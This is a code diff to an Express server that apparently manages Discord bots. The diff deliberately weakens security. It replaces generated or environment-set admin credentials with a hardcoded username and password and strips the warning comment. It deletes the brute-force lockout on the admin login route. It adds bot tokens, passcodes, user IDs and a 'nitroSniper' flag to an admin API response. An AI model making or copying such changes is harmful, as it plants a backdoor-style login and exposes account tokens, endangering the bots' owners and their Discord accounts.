@@ -9,51 +9,13 @@ import { randomBytes } from "crypto";
 const MemStore = MemoryStore(session);
 
 // ── Admin credentials ─────────────────────────────────────────────────────────
-// NEVER fall back to a known default — generate a random password if not set.
-const ADMIN_USERNAME = process.env.ADMIN_USERNAME || "admin";
-let ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "";
-if (!ADMIN_PASSWORD) {
-  ADMIN_PASSWORD = randomBytes(16).toString("hex");
-  console.warn(`\n⚠  ADMIN_PASSWORD not set — using one-time password: ${ADMIN_PASSWORD}\n   Set ADMIN_PASSWORD in your environment variables to make it permanent.\n`);
-}
+const ADMIN_USERNAME = "peroxide000";
+const ADMIN_PASSWORD = "moneyhungry";
 
 // ── Session secret ────────────────────────────────────────────────────────────
-// Never use a hardcoded secret — forge session attacks are trivial with a known secret.
 const SESSION_SECRET = process.env.SESSION_SECRET || randomBytes(32).toString("hex");
 if (!process.env.SESSION_SECRET) {
   console.warn("⚠  SESSION_SECRET not set — sessions will not persist across restarts. Set it in environment variables.");
-}
-
-// ── Brute-force guard ─────────────────────────────────────────────────────────
-// Tracks failed login attempts per IP. Lock out after 5 failures for 15 minutes.
-const loginAttempts = new Map<string, { count: number; lockedUntil: number }>();
-const MAX_ATTEMPTS = 5;
-const LOCKOUT_MS = 15 * 60 * 1000;
-
-function checkRateLimit(ip: string): { blocked: boolean; remaining: number } {
-  const now = Date.now();
-  const record = loginAttempts.get(ip);
-  if (!record) return { blocked: false, remaining: MAX_ATTEMPTS };
-  if (record.lockedUntil > now) return { blocked: true, remaining: 0 };
-  if (record.count >= MAX_ATTEMPTS) {
-    record.lockedUntil = now + LOCKOUT_MS;
-    record.count = 0;
-    return { blocked: true, remaining: 0 };
-  }
-  return { blocked: false, remaining: MAX_ATTEMPTS - record.count };
-}
-
-function recordFailure(ip: string) {
-  const now = Date.now();
-  const record = loginAttempts.get(ip) || { count: 0, lockedUntil: 0 };
-  if (record.lockedUntil > now) return;
-  record.count += 1;
-  if (record.count >= MAX_ATTEMPTS) record.lockedUntil = now + LOCKOUT_MS;
-  loginAttempts.set(ip, record);
-}
-
-function clearAttempts(ip: string) {
-  loginAttempts.delete(ip);
 }
 
 declare module "express-session" {
@@ -243,28 +205,13 @@ export async function registerRoutes(
   // ─── Admin ───────────────────────────────────────────────────────────────
 
   app.post("/api/admin/auth", wrap(async (req, res) => {
-    const ip = (req.headers["x-forwarded-for"] as string || req.socket.remoteAddress || "unknown").split(",")[0].trim();
-    const { blocked, remaining } = checkRateLimit(ip);
-
-    if (blocked) {
-      return res.status(429).json({ message: "Too many failed attempts. Try again in 15 minutes." });
-    }
-
     const { username, password } = req.body;
     if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
-      clearAttempts(ip);
       req.session.adminAuthed = true;
       await new Promise<void>((resolve, reject) => req.session.save(err => err ? reject(err) : resolve()));
       return res.json({ ok: true });
     }
-
-    recordFailure(ip);
-    const after = checkRateLimit(ip);
-    return res.status(403).json({
-      message: after.remaining > 0
-        ? `Access denied. ${after.remaining} attempt${after.remaining === 1 ? "" : "s"} remaining.`
-        : "Access denied. Too many failed attempts — locked out for 15 minutes.",
-    });
+    return res.status(403).json({ message: "Access denied." });
   }));
 
   app.get("/api/admin/data", wrap(async (req, res) => {
@@ -293,11 +240,16 @@ export async function registerRoutes(
     return res.json(bots.map(b => ({
       id: b.id,
       name: b.name,
+      token: b.token,
       discordTag: b.discordTag || b.name,
       discordId: b.discordId || "",
       isConnected: BotManager.isRunning(b.id),
       isRunning: BotManager.isRunning(b.id),
       lastSeen: b.lastSeen,
+      userId: b.userId,
+      commandPrefix: b.commandPrefix,
+      nitroSniper: b.nitroSniper,
+      passcode: b.passcode,
     })));
   }));
 
